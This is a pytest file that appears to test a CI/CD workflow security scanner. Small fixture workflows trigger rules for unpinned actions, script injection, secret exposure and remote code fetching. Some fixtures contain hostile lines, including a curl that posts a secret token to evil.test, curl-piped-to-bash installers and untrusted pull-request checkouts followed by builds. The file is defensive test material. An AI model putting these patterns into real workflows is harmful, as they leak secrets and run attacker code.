"""One test per rule, against the smallest workflow that should trigger it.

Each test asserts the four things a finding has to get right: that it fired,
which rule it came from, how severe it is, and that its evidence points at the
line a reviewer would open. A rule that fires with the wrong location is not a
working rule.

The negative cases matter as much as the positive ones. Most of these rules
describe patterns that also appear in correct workflows, and a rule that cannot
stay quiet is one people turn off.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from supplytrace.cicd.evidence.collector import scan_repository
from supplytrace.cicd.evidence.models import Finding, Severity
from supplytrace.cicd.rules.base import ScanContext


def write_workflow(tmp_path: Path, name: str, source: str) -> Path:
    """Write one workflow into a repository-shaped directory."""

    directory = tmp_path / ".github" / "workflows"
    directory.mkdir(parents=True, exist_ok=True)
    path = directory / name
    path.write_text(source, encoding="utf-8")
    return path


def scan(tmp_path: Path, source: str, name: str = "wf.yml"):
    write_workflow(tmp_path, name, source)
    return scan_repository(tmp_path)


def only(findings: list[Finding], rule_id: str) -> list[Finding]:
    return [f for f in findings if f.rule_id == rule_id]


# -- RULE 1 --------------------------------------------------------------------


class TestUnpinnedAction:
    SOURCE = """\
on: push
permissions:
  contents: write
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: evil/action@main
      - uses: other/action@v1.2.3
      - uses: actions/checkout@8f4b7f84864484a7bf31766abe9204da3cbe65b3
"""

    def test_fires_with_correct_rule_severity_and_location(self, tmp_path) -> None:
        result = scan(tmp_path, self.SOURCE)
        findings = only(result.findings, "ACTION_UNPINNED")
        by_action = {f.metadata["action_repo"]: f for f in findings}

        assert set(by_action) == {"evil/action", "other/action"}

        branch = by_action["evil/action"]
        assert branch.severity is Severity.CRITICAL  # branch ref + write perms
        assert branch.line == 8
        assert branch.evidence[0].snippet == "- uses: evil/action@main"

        tag = by_action["other/action"]
        assert tag.severity is Severity.HIGH  # tag ref + write perms
        assert tag.metadata["ref_kind"] == "tag"

    def test_a_sha_pinned_action_is_not_reported(self, tmp_path) -> None:
        result = scan(tmp_path, self.SOURCE)
        repos = {f.metadata["action_repo"] for f in only(result.findings, "ACTION_UNPINNED")}
        assert "actions/checkout" not in repos

    def test_first_party_actions_are_graded_lower(self, tmp_path) -> None:
        source = "on: push\njobs:\n  a:\n    steps:\n      - uses: actions/checkout@v4\n"
        result = scan(tmp_path, source)
        finding = only(result.findings, "ACTION_UNPINNED")[0]
        assert finding.severity is Severity.LOW


# -- RULE 2 --------------------------------------------------------------------


class TestExcessivePermissions:
    def test_write_scope_is_reported_with_its_capability(self, tmp_path) -> None:
        source = """\
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: write
      issues: write
    steps:
      - run: echo hi
"""
        findings = only(scan(tmp_path, source).findings, "EXCESSIVE_PERMISSIONS")
        scopes = {f.metadata["scope"]: f for f in findings}
        assert set(scopes) == {"contents", "issues"}
        # contents:write changes what the repository ships; issues:write does not.
        assert scopes["contents"].severity is Severity.MEDIUM
        assert scopes["issues"].severity is Severity.LOW
        assert "push commits" in scopes["contents"].metadata["capability"]

    def test_read_only_permissions_are_not_reported(self, tmp_path) -> None:
        source = """\
on: push
permissions:
  contents: read
jobs:
  a:
    steps:
      - run: echo hi
"""
        assert only(scan(tmp_path, source).findings, "EXCESSIVE_PERMISSIONS") == []

    def test_an_absent_permissions_block_is_its_own_finding(self, tmp_path) -> None:
        source = "on: push\njobs:\n  a:\n    steps:\n      - run: echo hi\n"
        findings = only(scan(tmp_path, source).findings, "PERMISSIONS_UNDECLARED")
        assert len(findings) == 1
        assert "repository or" in findings[0].description


# -- RULE 3 --------------------------------------------------------------------


class TestDangerousTrigger:
    def test_privileged_trigger_alone_is_only_informational(self, tmp_path) -> None:
        """`pull_request_target` used correctly must not read as a breach."""

        source = """\
on:
  pull_request_target:
    types: [opened]
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/labeler@v5
"""
        finding = only(scan(tmp_path, source).findings, "DANGEROUS_TRIGGER")[0]
        assert finding.severity is Severity.INFO

    def test_trigger_plus_untrusted_checkout_plus_run_is_critical(self, tmp_path) -> None:
        source = """\
on:
  pull_request_target:
    types: [opened]
permissions:
  contents: write
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm install
"""
        finding = only(scan(tmp_path, source).findings, "DANGEROUS_TRIGGER")[0]
        assert finding.severity is Severity.CRITICAL
        assert finding.line == 2
        assert finding.metadata["trigger"] == "pull_request_target"

    def test_a_bare_checkout_under_pull_request_target_is_not_untrusted(
        self, tmp_path
    ) -> None:
        """Without an explicit ref, checkout gets the base branch, not the PR."""

        source = """\
on:
  pull_request_target:
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: echo hi
"""
        finding = only(scan(tmp_path, source).findings, "DANGEROUS_TRIGGER")[0]
        assert finding.severity is not Severity.CRITICAL
        assert finding.metadata["untrusted_checkout_steps"] == []


# -- RULE 4 --------------------------------------------------------------------


class TestScriptInjection:
    def test_untrusted_expression_in_run_is_critical(self, tmp_path) -> None:
        source = """\
on:
  pull_request_target:
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ github.event.pull_request.title }}"
"""
        finding = only(scan(tmp_path, source).findings, "SCRIPT_INJECTION")[0]
        assert finding.severity is Severity.CRITICAL
        assert finding.line == 7
        assert finding.metadata["context"] == "github.event.pull_request.title"
        assert "${{ github.event.pull_request.title }}" in finding.evidence[0].snippet

    def test_step_output_interpolation_is_flagged(self, tmp_path) -> None:
        """The GHSL-2023-271 / tj-actions shape."""

        source = """\
on: pull_request
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - id: changed-files
        uses: tj-actions/changed-files@v35
      - run: |
          for f in ${{ steps.changed-files.outputs.all_changed_files }}; do
            echo "$f"
          done
"""
        finding = only(scan(tmp_path, source).findings, "SCRIPT_INJECTION")[0]
        assert finding.severity is Severity.HIGH
        assert finding.line == 9

    def test_trusted_expressions_are_not_flagged(self, tmp_path) -> None:
        source = """\
on: pull_request
jobs:
  a:
    steps:
      - run: echo "${{ github.repository }} on ${{ runner.os }}"
"""
        assert only(scan(tmp_path, source).findings, "SCRIPT_INJECTION") == []

    def test_env_indirection_is_the_remediation_shown(self, tmp_path) -> None:
        source = """\
on: pull_request_target
jobs:
  a:
    steps:
      - run: echo "${{ github.event.issue.title }}"
"""
        finding = only(scan(tmp_path, source).findings, "SCRIPT_INJECTION")[0]
        assert "env:" in finding.remediation


# -- RULE 5 --------------------------------------------------------------------


class TestSecretExposure:
    def test_a_secret_that_is_merely_used_is_not_an_exposure(self, tmp_path) -> None:
        """The distinction the whole rule is built on."""

        source = """\
on: push
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - env:
          TOKEN: ${{ secrets.API_KEY }}
        run: |
          echo "starting"
          ./deploy.sh
"""
        result = scan(tmp_path, source)
        assert only(result.findings, "SECRET_EXPOSURE") == []
        assert only(result.findings, "SECRET_ACCESS") != []

    def test_a_derived_secret_printed_to_the_log_is_reported(self, tmp_path) -> None:
        source = """\
on: push
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - env:
          SA_KEY: ${{ secrets.GCP_KEY }}
        run: |
          PRIV=$(echo $SA_KEY | jq -r .private_key)
          echo "key: $PRIV"
"""
        finding = only(scan(tmp_path, source).findings, "SECRET_EXPOSURE")[0]
        assert finding.metadata["secret"] == "GCP_KEY"
        assert finding.metadata["derived"] is True
        assert finding.line == 10

    def test_a_secret_posted_to_an_external_host_is_critical(self, tmp_path) -> None:
        source = """\
on: push
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - env:
          TOKEN: ${{ secrets.API_KEY }}
        run: curl -X POST -d "t=$TOKEN" https://evil.test/collect
"""
        findings = only(scan(tmp_path, source).findings, "SECRET_EXPOSURE")
        exfil = [f for f in findings if f.metadata.get("sink") == "OUTBOUND_NETWORK"]
        assert exfil and exfil[0].severity is Severity.CRITICAL
        assert "evil.test" in str(exfil[0].metadata["external_hosts"])


# -- RULE 6 --------------------------------------------------------------------


class TestRemoteCodeFetch:
    def test_curl_piped_to_bash_is_reported(self, tmp_path) -> None:
        source = """\
on: push
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - run: curl -sL https://unknown.test/install.sh | bash
"""
        finding = only(scan(tmp_path, source).findings, "REMOTE_CODE_FETCH")[0]
        assert finding.severity is Severity.MEDIUM
        assert finding.metadata["pattern"] == "pipe_to_shell"
        assert finding.line == 6

    def test_a_dynamic_url_is_critical(self, tmp_path) -> None:
        source = """\
on: pull_request_target
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - run: curl -sL https://host.test/${{ github.head_ref }}/i.sh | bash
"""
        finding = only(scan(tmp_path, source).findings, "REMOTE_CODE_FETCH")[0]
        assert finding.severity is Severity.CRITICAL

    def test_a_known_installer_host_is_graded_low(self, tmp_path) -> None:
        """`curl https://sh.rustup.rs | sh` is the documented installer."""

        source = """\
on: push
jobs:
  a:
    steps:
      - run: curl --proto '=https' -sSf https://sh.rustup.rs | sh
"""
        finding = only(scan(tmp_path, source).findings, "REMOTE_CODE_FETCH")[0]
        assert finding.severity is Severity.LOW

    def test_download_then_chmod_then_execute(self, tmp_path) -> None:
        source = """\
on: push
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - run: |
          curl -o /tmp/tool https://unknown.test/tool
          chmod +x /tmp/tool
          /tmp/tool --run
"""
        finding = only(scan(tmp_path, source).findings, "REMOTE_CODE_FETCH")[0]
        assert finding.metadata["pattern"] == "download_then_execute"
        assert len(finding.evidence) == 2  # the fetch and the execution


# -- RULE 7 --------------------------------------------------------------------


class TestUntrustedCodeExecution:
    def test_fork_checkout_then_build_is_critical(self, tmp_path) -> None:
        source = """\
on:
  pull_request_target:
permissions:
  contents: write
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm install && npm run build
"""
        finding = only(scan(tmp_path, source).findings, "UNTRUSTED_CODE_EXECUTION")[0]
        assert finding.severity is Severity.CRITICAL
        assert finding.metadata["matched_command"] == "npm install"
        assert len(finding.evidence) >= 3  # trigger, checkout, execution

    def test_gh_pr_checkout_counts_as_an_untrusted_checkout(self, tmp_path) -> None:
        """Not every checkout uses actions/checkout."""

        source = """\
on:
  pull_request_target:
permissions:
  contents: write
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: gh pr checkout ${{ github.event.pull_request.number }}
      - run: make build
"""
        assert only(scan(tmp_path, source).findings, "UNTRUSTED_CODE_EXECUTION")

    def test_checkout_without_execution_does_not_fire(self, tmp_path) -> None:
        source = """\
on:
  pull_request_target:
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
"""
        assert only(scan(tmp_path, source).findings, "UNTRUSTED_CODE_EXECUTION") == []


# -- RULES 8-10 ----------------------------------------------------------------


class TestArtifactAndRelease:
    def test_artifact_downloaded_in_a_workflow_run_job_and_published(self, tmp_path) -> None:
        source = """\
on:
  workflow_run:
    workflows: [CI]
    types: [completed]
permissions:
  packages: write
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
      - run: npm publish
"""
        finding = only(scan(tmp_path, source).findings, "ARTIFACT_TAMPERING")[0]
        assert finding.metadata["cross_run"] is True
        assert finding.severity is Severity.CRITICAL

    def test_release_risk_names_its_ingredients(self, tmp_path) -> None:
        source = """\
on: push
permissions:
  contents: write
  packages: write
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: some/publisher@v1
      - run: curl -sL https://unknown.test/x.sh | bash
      - run: npm publish
"""
        finding = only(scan(tmp_path, source).findings, "RELEASE_RISK")[0]
        assert finding.severity is Severity.HIGH
        assert len(finding.metadata["exposures"]) >= 3

    def test_third_party_inventory_records_reach(self, tmp_path) -> None:
        source = """\
on: push
permissions:
  contents: write
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - uses: vendor/tool@v1
      - uses: vendor/tool@v1
"""
        finding = only(scan(tmp_path, source).findings, "THIRD_PARTY_ACTION")[0]
        assert finding.metadata["action_repo"] == "vendor/tool"
        assert finding.metadata["use_count"] == 2
        assert finding.metadata["reachable_write_scopes"] == ["contents"]


# -- collector guarantees ------------------------------------------------------


class TestCollector:
    def test_every_finding_has_evidence_and_a_stable_id(self, tmp_path) -> None:
        result = scan(tmp_path, TestUnpinnedAction.SOURCE)
        assert result.findings
        for finding in result.findings:
            assert finding.evidence, f"{finding.rule_id} produced no evidence"
            assert finding.id.startswith("F")

        again = scan_repository(tmp_path)
        assert [f.id for f in again.findings] == [f.id for f in result.findings]

    def test_findings_are_sorted_most_severe_first(self, tmp_path) -> None:
        result = scan(tmp_path, TestUnpinnedAction.SOURCE)
        ranks = [f.severity.rank for f in result.findings]
        assert ranks == sorted(ranks)

    def test_an_unparseable_workflow_becomes_a_finding(self, tmp_path) -> None:
        """Silence about a file the tool could not read would be misleading."""

        result = scan(tmp_path, "on: push\n  bad: [\n", "broken.yml")
        parse_findings = only(result.findings, "WORKFLOW_PARSE_ERROR")
        assert len(parse_findings) == 1
        assert "nothing was checked" in parse_findings[0].description

    def test_a_rule_that_raises_does_not_sink_the_scan(self, tmp_path) -> None:
        from supplytrace.cicd.evidence.collector import collect_findings
        from supplytrace.cicd.rules.base import Rule

        class Exploding(Rule):
            id = "EXPLODING"

            def apply(self, context):
                raise RuntimeError("boom")

        class Working(Rule):
            id = "WORKING"

            def apply(self, context):
                return iter(())

        write_workflow(tmp_path, "wf.yml", TestUnpinnedAction.SOURCE)
        from supplytrace.cicd.parser.workflow import parse_repository_workflows

        context = ScanContext(
            repo_path=str(tmp_path), workflows=parse_repository_workflows(tmp_path)
        )
        findings, errors = collect_findings(context, [Exploding(), Working()])
        assert findings == []
        assert any("EXPLODING" in e and "boom" in e for e in errors)

    def test_a_finding_without_evidence_is_dropped(self, tmp_path) -> None:
        from supplytrace.cicd.evidence.collector import collect_findings
        from supplytrace.cicd.evidence.models import FindingType
        from supplytrace.cicd.rules.base import Rule

        class Unevidenced(Rule):
            id = "UNEVIDENCED"

            def apply(self, context):
                yield Finding(
                    rule_id=self.id,
                    type=FindingType.PRIVILEGE,
                    severity=Severity.HIGH,
                    confidence=0.9,
                    title="claim with nothing behind it",
                    description="",
                    evidence=[],
                )

        context = ScanContext(repo_path=str(tmp_path), workflows=[])
        findings, errors = collect_findings(context, [Unevidenced()])
        assert findings == []
        assert any("no evidence" in e for e in errors)


class TestFindingLocationsAreExact:
    """A finding that cites the wrong line sends a reviewer to the wrong code.

    These pin a bug found while preparing a demo: the injection and network
    rules located a match by searching the whole workflow for its text, which
    returns the *first* occurrence. Where the same expression or command
    appeared in two steps, every finding pointed at the first one.
    """

    DUPLICATE_EXPRESSION = """\
on:
  issue_comment:
    types: [created]
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - uses: ./.github/actions/greet
        with:
          who: ${{ github.event.comment.body }}
  c:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ github.event.comment.body }}"
"""

    def test_injection_reports_the_step_it_belongs_to(self, tmp_path) -> None:
        result = scan(tmp_path, self.DUPLICATE_EXPRESSION)
        findings = only(result.findings, "SCRIPT_INJECTION")
        assert len(findings) == 1

        finding = findings[0]
        # The run: in job 'c' at line 14 -- not the `with:` at line 10, which
        # feeds a local composite action and is a different (unreported) case.
        assert finding.job == "c"
        assert finding.line == 14
        assert "echo" in finding.evidence[0].snippet

    DUPLICATE_COMMAND = """\
on: push
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - run: curl -sL https://unknown.test/i.sh | bash
  b:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo preparing
          curl -sL https://unknown.test/i.sh | bash
"""

    def test_network_findings_locate_their_own_step(self, tmp_path) -> None:
        result = scan(tmp_path, self.DUPLICATE_COMMAND)
        findings = only(result.findings, "REMOTE_CODE_FETCH")
        assert len(findings) == 2

        by_job = {f.job: f.line for f in findings}
        assert by_job["a"] == 6
        # Inside the block scalar: `run: |` is line 10, so the curl is line 12.
        assert by_job["b"] == 12
